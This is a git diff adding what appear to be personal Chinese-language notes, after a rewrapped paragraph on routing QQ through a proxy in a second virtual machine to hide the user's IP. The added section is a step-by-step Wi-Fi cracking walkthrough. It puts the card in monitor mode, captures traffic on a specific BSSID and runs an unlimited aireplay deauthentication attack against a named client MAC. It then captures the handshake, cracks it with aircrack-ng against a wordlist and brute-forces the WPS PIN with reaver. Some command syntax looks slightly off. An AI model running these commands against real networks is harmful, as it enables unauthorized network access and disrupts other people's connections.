@@ -354,5 +354,58 @@ WinPCap
 
 ****
 
-- 多重代理正宗的做法】如下： 　　装2个虚拟机系统（简称 A 系统 和 B 系统）。A 系统装翻墙软件，配置双网卡，分别用 NAT 模式和  Host-Only 模式。B 系统装 QQ，单网卡，配置为 Host-Only 模式。然后配置 QQ 的代理，让 QQ 的代理指向 A  系统的翻墙软件。由于 B 系统的网卡是 Host-Only 模式，QQ 客户端即使想偷偷地直连服务器，也办不到。所以，QQ 只能老老实实地通过 A 系统中转。由于 A 系统的中转是通过翻墙代理，最终 QQ 服务器看到的是翻墙代理的 IP，看不到你本人的真实 IP。
+- 多重代理正宗的做法】如下： 　　装2个虚拟机系统（简称 A 系统 和 B 系统）。A 系统装翻墙软件，配置双网卡，分别用 NAT 模式和  Host-Only 模式。B 系统装 QQ，单网卡，配置为 Host-Only 模式。然后配置 QQ 的代理，让 QQ 的代理指向 A  系统的翻墙软件。由于 B 系统的网卡是 Host-Only 模式，QQ 客户端即使想偷偷地直连服务器，也办不到。所以，QQ 只能老老实
+- 实地通过 A 系统中转。由于 A 系统的中转是通过翻墙代理，最终 QQ 服务器看到的是翻墙代理的 IP，看不到你本人的真实 IP。
 
+
+
+
+
+****
+
+**airdump都是数据包的捕获以及监听特定数据包进行的**
+
+**airmon-ng 处理网卡工作模式**
+
+**aircrack-ng 破解**
+
+**aireplay-ng 发包，干扰**
+
+****
+
+**连上之后先start设备进行网卡监听的模式 sudo airmon-ng start 设备
+
+**之后进行扫描设备 sudo airodump-ng mon0 进行wifi扫描
+
+**之后监听特定的频道:
+
+sudo airodump-ng -c 6 -w Desktop/handshake --bssid C0:00:00:00:00:48 mon0
+
+**之后进行强行攻击:
+
+```
+sudo aireplay -0 0 -a C8:3A:35:2D:A7:F8 -c DC:74:A8:08:B7:D0 wlan0mon
+-0表示进行攻击 0 表示攻击次数无限次 -a表示是服务端 -c是客户端
+```
+
+**之后进行获取到握手包:
+
+```
+sudo airodump-ng -c 6-ivs -w test --bssid C8:3A:35:2D:A7:F8 wlan0mon
+```
+
+**之后进行破解:
+
+```
+sudo aircrack-ng -w 1.txt test-02.ivs-01.ivs
+```
+
+
+
+
+
+pin破解:
+
+```
+sudo reaver -i mon0 -b 5C:63:BF:C4:A4:CE -vv 
+```
